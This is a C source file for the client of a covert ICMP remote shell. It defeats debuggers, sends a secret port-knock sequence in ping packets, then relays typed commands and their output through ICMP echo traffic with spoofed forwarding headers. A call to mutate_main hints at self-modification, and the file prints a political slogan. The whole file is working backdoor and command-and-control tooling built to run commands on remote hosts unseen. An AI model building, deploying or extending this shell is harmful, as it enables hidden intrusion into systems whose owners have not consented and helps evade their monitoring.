#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <wchar.h>
#include <locale.h>
#include "includes/anti_debug.h"
#include "includes/icmp_common.h"

#define KNOCK_PORT 12345
#define BUFSIZE 4096
#define END_MARKER "__END__"
#define HEADER_IP "127.0.0.1"

extern void anti_debug(void);                
extern void check_tracer_pid(void);
extern void block_ptrace_attaches(void);
extern void install_seccomp_ptrace_kill(void);
extern int mutate_main(void);

#define SEQ_LEN 3
const char *KNOCK_SEQUENCE[SEQ_LEN] = {
    "nqXCT2xfFsvYktHG3d8gPV",
    "VqhEGfaeFTdSmUW7M4QkNz",
    "VXjdmp4QcBtH75S2Yf8gPx"
};
const int INTERVALS[SEQ_LEN] = {1, 2, 3};

int sock = -1;  // Global socket descriptor for signal handler

void cleanup() {
    if (sock != -1) {
        close(sock);
        sock = -1;
    }
    exit(0);
}

void handle_signal(int sig) {
    printf("\n[*] Caught signal %d, cleaning up...\n", sig);
    cleanup();
}

// Send ICMP echo request with custom headers
int send_icmp_echo_with_headers(int sock, const char *dest_ip, const char *payload, int payload_len) {
    struct sockaddr_in dest_addr;
    char packet[BUFSIZE];
    struct icmp_header *icmp_hdr = (struct icmp_header *)packet;
    
    // Build custom header
    struct custom_icmp_header custom_hdr = {
        .magic = htonl(0xDEADBEEF),
        .timestamp = time(NULL),
        .ttl = 64,
        .flags = 0x01,
    };

    // Copy the IP address to each field
    strncpy(custom_hdr.x_forwarded_for, HEADER_IP, sizeof(custom_hdr.x_forwarded_for) - 1);
    strncpy(custom_hdr.x_originating_ip, HEADER_IP, sizeof(custom_hdr.x_originating_ip) - 1);
    strncpy(custom_hdr.x_remote_ip, HEADER_IP, sizeof(custom_hdr.x_remote_ip) - 1);
    strncpy(custom_hdr.x_remote_addr, HEADER_IP, sizeof(custom_hdr.x_remote_addr) - 1); 
    
    // Ensure null termination
    custom_hdr.x_forwarded_for[sizeof(custom_hdr.x_forwarded_for) - 1] = '\0';
    custom_hdr.x_originating_ip[sizeof(custom_hdr.x_originating_ip) - 1] = '\0';
    custom_hdr.x_remote_ip[sizeof(custom_hdr.x_remote_ip) - 1] = '\0';
    custom_hdr.x_remote_addr[sizeof(custom_hdr.x_remote_addr) - 1] = '\0';
    
    // Build ICMP echo request
    icmp_hdr->type = ICMP_ECHO;
    icmp_hdr->code = 0;
    icmp_hdr->un.echo.id = getpid();
    icmp_hdr->un.echo.sequence = 0;
    
    // Copy custom header and payload
    char *data_ptr = packet + sizeof(struct icmp_header);
    memcpy(data_ptr, &custom_hdr, sizeof(custom_hdr));
    data_ptr += sizeof(custom_hdr);
    
    if (payload_len > 0) {
        memcpy(data_ptr, payload, payload_len);
    }
    
    // Calculate checksum
    icmp_hdr->checksum = 0;
    int total_len = sizeof(struct icmp_header) + sizeof(custom_hdr) + payload_len;
    icmp_hdr->checksum = checksum((unsigned short *)icmp_hdr, total_len);
    
    // Set up destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(dest_ip);
    
    // Send the packet
    return sendto(sock, packet, total_len, 0,
                 (struct sockaddr *)&dest_addr, sizeof(dest_addr));
}

// Send ICMP echo request with payload (for knocking)
int send_icmp_echo(int sock, const char *dest_ip, const char *payload, int payload_len) {
    struct sockaddr_in dest_addr;
    char packet[BUFSIZE];
    struct icmp_header *icmp_hdr = (struct icmp_header *)packet;
    
    // Build ICMP echo request
    icmp_hdr->type = ICMP_ECHO;
    icmp_hdr->code = 0;
    icmp_hdr->un.echo.id = getpid();
    icmp_hdr->un.echo.sequence = 0;
    
    // Copy payload
    if (payload_len > 0 && payload_len < (int)(BUFSIZE - sizeof(struct icmp_header))) {
        memcpy(packet + sizeof(struct icmp_header), payload, payload_len);
    }
    
    // Calculate checksum
    icmp_hdr->checksum = 0;
    icmp_hdr->checksum = checksum((unsigned short *)icmp_hdr, 
                                 sizeof(struct icmp_header) + payload_len);
    
    // Set up destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(dest_ip);
    
    // Send the packet
    return sendto(sock, packet, sizeof(struct icmp_header) + payload_len, 0,
                 (struct sockaddr *)&dest_addr, sizeof(dest_addr));
}

// Receive ICMP echo reply
int recv_icmp_reply(int sock, char *buffer, int buf_size, struct sockaddr_in *src_addr) {
    char packet_buffer[BUFSIZE];
    socklen_t addr_len = sizeof(struct sockaddr_in);
    ssize_t n;
    
    while (1) {
        n = recvfrom(sock, packet_buffer, sizeof(packet_buffer), 0, (struct sockaddr *)src_addr, &addr_len);
        if (n <= 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        
        // Parse IP header
        struct iphdr *ip_header = (struct iphdr *)packet_buffer;
        int ip_header_len = ip_header->ihl * 4;
        
        if (n < ip_header_len + (int)sizeof(struct icmp_header)) {
            continue; // Not a complete ICMP packet
        }
        
        struct icmp_header *icmp_hdr = (struct icmp_header *)(packet_buffer + ip_header_len);
        
        // Only process echo replies with our PID
        if (icmp_hdr->type == ICMP_ECHOREPLY && icmp_hdr->un.echo.id == getpid()) {
            int payload_len = n - ip_header_len - sizeof(struct icmp_header);
            if (payload_len > buf_size) {
                payload_len = buf_size;
            }
            
            // Copy only the payload to the output buffer
            char *payload = (char *)(icmp_hdr + 1);
            
            // Check if this is a custom header response and skip it
	    if (payload_len >= (int)sizeof(struct custom_icmp_header)) {
                struct custom_icmp_header *custom_hdr = (struct custom_icmp_header *)payload;
                if (ntohl(custom_hdr->magic) == 0xDEADBEEF) {
                    // This is a custom header response, skip it
                    continue;
                }
            }
            
            memcpy(buffer, payload, payload_len);
            return payload_len;
        }
    }
}

void send_knock_sequence_icmp(const char *ip) {
    printf("[*] Initiating knock sequence. Please wait.\n");
    sleep(3);
    printf("[*] \u262D Political power grows out of the barrel of a gun \u262D\n");
    for (int i = 0; i < SEQ_LEN; i++) {
        int tmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (tmp_sock < 0) {
            perror("ICMP socket");
            exit(1);
        }
        
        if (send_icmp_echo(tmp_sock, ip, KNOCK_SEQUENCE[i], strlen(KNOCK_SEQUENCE[i])) < 0) {
            perror("ICMP send knock");
            close(tmp_sock);
            exit(1);
        }
        
        close(tmp_sock);
        sleep(INTERVALS[i]);
    }
}

int main(int argc, char *argv[]) {
    char buffer[BUFSIZE];
    struct sockaddr_in server_addr;

    // Set up signal handlers
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGQUIT, handle_signal);

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <server_ip>\n", argv[0]);
        return 1;
    }

    anti_debug();
    send_knock_sequence_icmp(argv[1]);

    // Create main ICMP socket for shell interaction
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("ICMP socket");
        return 1;
    }

    printf("[+] ICMP shell connected. Type commands (type 'exit' to quit):\n");

    while (1) {
        printf("icmp-shell> ");
        fflush(stdout);

        memset(buffer, 0, BUFSIZE);
        if (!fgets(buffer, BUFSIZE, stdin)) {
            // Handle EOF (Ctrl+D)
            printf("\n[*] EOF received, exiting...\n");
            break;
        }

        buffer[strcspn(buffer, "\n")] = 0;

        if (strcmp(buffer, "exit") == 0) {
            printf("[*] Exiting.\n");
            break;
        }

        // Send command via ICMP echo request with custom headers
        if (send_icmp_echo_with_headers(sock, argv[1], buffer, strlen(buffer)) < 0) {
            perror("ICMP send command");
            break;
        }

        // Receive output from ICMP echo replies
        while (1) {
            char output_buffer[BUFSIZE];
            memset(output_buffer, 0, BUFSIZE);
            
            int payload_len = recv_icmp_reply(sock, output_buffer, BUFSIZE, &server_addr);
            
            if (payload_len <= 0) {
                fprintf(stderr, "[!] Connection closed or error.\n");
                cleanup();
                return 1;
            }
            
            // Ensure null termination
            if (payload_len < BUFSIZE) {
                output_buffer[payload_len] = '\0';
            }
            
            // Check for end marker
            if (strncmp(output_buffer, END_MARKER, strlen(END_MARKER)) == 0) {
                break;
            }
            
            // Skip if it matches the command string
            if (strcmp(output_buffer, buffer) == 0) {
                continue;
            }
            
            // Output the result without adding extra newlines
            int len = strlen(output_buffer);
            if (len > 0 && output_buffer[len-1] == '\n') {
                printf("%s", output_buffer);
            } else {
                printf("%s\n", output_buffer);
            } 
        }
        mutate_main();
    }
    cleanup();
    return 0;
}
